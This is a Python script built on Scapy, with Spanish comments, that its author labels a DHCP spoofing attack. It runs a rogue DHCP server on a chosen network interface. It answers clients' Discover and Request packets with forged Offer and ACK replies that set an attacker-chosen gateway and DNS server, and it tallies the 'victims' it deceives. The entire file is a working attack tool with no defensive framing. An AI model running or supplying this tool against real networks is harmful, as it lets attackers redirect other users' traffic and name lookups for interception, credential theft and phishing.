#!/usr/bin/env python3

#########################################################
# Ataque:  DHCP Spoofing
# Autor:   Luiggy Encarnacion
#########################################################

from scapy.all import *
import sys
import time
import signal

stats = {
    "discovers" : 0,
    "offers"    : 0,
    "requests"  : 0,
    "acks"      : 0,
    "start_time": None
}

IP_POOL = {}

# ─────────────────────────────────────────
def banner(title):
    width = 40
    print()
    print("  ╔" + "═" * width + "╗")
    print("  ║" + title.center(width) + "║")
    print("  ╚" + "═" * width + "╝")

def separator():
    print("  " + "─" * 62)

def row(tiempo, mensaje, mac, ip, extra=""):
    print(f"  {tiempo:<8} {mensaje:<12} {mac:<22}  {ip:<16} {extra}")

def elapsed_str():
    elapsed    = int(time.time() - stats["start_time"])
    mins, secs = divmod(elapsed, 60)
    return f"{mins:02d}:{secs:02d}"

# ─────────────────────────────────────────
def select_interface():
    try:
        from scapy.all import get_if_list
        interfaces = get_if_list()
    except Exception:
        interfaces = []

    if not interfaces:
        print("  [!] No se detectaron interfaces de red.")
        iface = input("  Ingrese el nombre de la interfaz manualmente: ").strip()
        return iface

    print()
    print("  Interfaces de red disponibles:")
    for i, iface in enumerate(interfaces, 1):
        print(f"    [{i}] {iface}")
    print()

    while True:
        seleccion = input("  Seleccione interfaz (número o nombre): ").strip()
        if seleccion.isdigit():
            idx = int(seleccion) - 1
            if 0 <= idx < len(interfaces):
                return interfaces[idx]
            else:
                print("  [!] Número fuera de rango. Intente de nuevo.")
        elif seleccion in interfaces:
            return seleccion
        else:
            print("  [!] Interfaz no válida. Intente de nuevo.")

def solicitar_parametros():
    banner("DHCP Spoofing Attack")
    print()

    try:
        iface       = select_interface()
        print()
        fake_gw     = input("  Ingrese la IP del gateway/servidor falso : ").strip()
        fake_dns    = input("  Ingrese la IP del DNS falso              : ").strip()
        subnet_mask = input("  Ingrese la máscara de subred             : ").strip()
        lease_time  = input("  Ingrese el tiempo de lease (segundos)    : ").strip()
        ip_inicial  = input("  Ingrese la IP inicial del pool           : ").strip()
        print()
    except KeyboardInterrupt:
        print()
        print("  [!] Saliendo.")
        sys.exit(0)

    partes       = ip_inicial.rsplit(".", 1)
    pool_prefix  = partes[0]
    ip_counter   = int(partes[1])

    return iface, fake_gw, fake_dns, subnet_mask, int(lease_time), ip_counter, pool_prefix

# ─────────────────────────────────────────
def main():
    IFACE, FAKE_GW, FAKE_DNS, SUBNET_MASK, LEASE_TIME, IP_COUNTER_START, POOL_PREFIX = solicitar_parametros()

    ip_counter_ref = [IP_COUNTER_START]

    def get_next_ip():
        ip = f"{POOL_PREFIX}.{ip_counter_ref[0]}"
        ip_counter_ref[0] += 1
        return ip

    def handle_dhcp(pkt):
        if not pkt.haslayer(DHCP):
            return

        msg_type = pkt[DHCP].options[0][1]

        # ── DHCP Discover ──────────────────────
        if msg_type == 1:
            stats["discovers"] += 1
            client_mac = pkt[Ether].src

            if client_mac not in IP_POOL:
                IP_POOL[client_mac] = get_next_ip()
            offered_ip = IP_POOL[client_mac]

            row(elapsed_str(), "DISCOVER", client_mac, offered_ip)

            offer = (
                Ether(src=get_if_hwaddr(IFACE), dst=client_mac) /
                IP(src=FAKE_GW, dst="255.255.255.255") /
                UDP(sport=67, dport=68) /
                BOOTP(op=2, yiaddr=offered_ip,
                      siaddr=FAKE_GW, chaddr=pkt[BOOTP].chaddr,
                      xid=pkt[BOOTP].xid) /
                DHCP(options=[
                    ("message-type", "offer"),
                    ("server_id",    FAKE_GW),
                    ("lease_time",   LEASE_TIME),
                    ("subnet_mask",  SUBNET_MASK),
                    ("router",       FAKE_GW),
                    ("name_server",  FAKE_DNS),
                    "end"
                ])
            )
            sendp(offer, iface=IFACE, verbose=False)
            stats["offers"] += 1
            row("        ", "OFFER", get_if_hwaddr(IFACE), offered_ip)

        # ── DHCP Request ───────────────────────
        elif msg_type == 3:
            stats["requests"] += 1
            client_mac   = pkt[Ether].src
            requested_ip = IP_POOL.get(client_mac, get_next_ip())

            row(elapsed_str(), "REQUEST", client_mac, requested_ip)

            ack = (
                Ether(src=get_if_hwaddr(IFACE), dst=client_mac) /
                IP(src=FAKE_GW, dst="255.255.255.255") /
                UDP(sport=67, dport=68) /
                BOOTP(op=2, yiaddr=requested_ip,
                      siaddr=FAKE_GW, chaddr=pkt[BOOTP].chaddr,
                      xid=pkt[BOOTP].xid) /
                DHCP(options=[
                    ("message-type", "ack"),
                    ("server_id",    FAKE_GW),
                    ("lease_time",   LEASE_TIME),
                    ("subnet_mask",  SUBNET_MASK),
                    ("router",       FAKE_GW),
                    ("name_server",  FAKE_DNS),
                    "end"
                ])
            )
            sendp(ack, iface=IFACE, verbose=False)
            stats["acks"] += 1
            row("        ", "ACK", get_if_hwaddr(IFACE), requested_ip, "✓")
            separator()

    def print_summary(sig=None, frame=None):
        elapsed    = max(int(time.time() - stats["start_time"]), 1)
        mins, secs = divmod(elapsed, 60)

        print()
        banner("Resumen Final")
        print(f"  Tiempo activo       : {mins:02d}:{secs:02d}")
        separator()
        print(f"  DISCOVERs recibidos : {stats['discovers']:>5}")
        print(f"  OFFERs enviados     : {stats['offers']:>5}")
        print(f"  REQUESTs recibidos  : {stats['requests']:>5}")
        print(f"  ACKs enviados       : {stats['acks']:>5}")
        print(f"  Clientes engañados  : {len(IP_POOL):>5}")
        separator()
        print("  [+] Saliendo.")
        print()
        sys.exit(0)

    signal.signal(signal.SIGINT, print_summary)

    banner("DHCP Spoofing Attack")
    print(f"  Interfaz    : {IFACE}")
    print(f"  Gateway     : {FAKE_GW}")
    print(f"  DNS Falso   : {FAKE_DNS}")
    print(f"  Máscara     : {SUBNET_MASK}")
    print(f"  IP Pool     : {POOL_PREFIX}.{IP_COUNTER_START} en adelante")
    separator()
    print(f"  [*] Servidor DHCP falso activo...")
    print(f"  [*] Esperando víctimas en {IFACE}...")
    print()

    print(f"  {'Tiempo':<8} {'Mensaje':<12} {'MAC':<22}  {'IP Asignada':<16}")
    separator()

    stats["start_time"] = time.time()

    sniff(
        iface=IFACE,
        filter="udp and (port 67 or port 68)",
        prn=handle_dhcp,
        store=0
    )

if __name__ == "__main__":
    main()
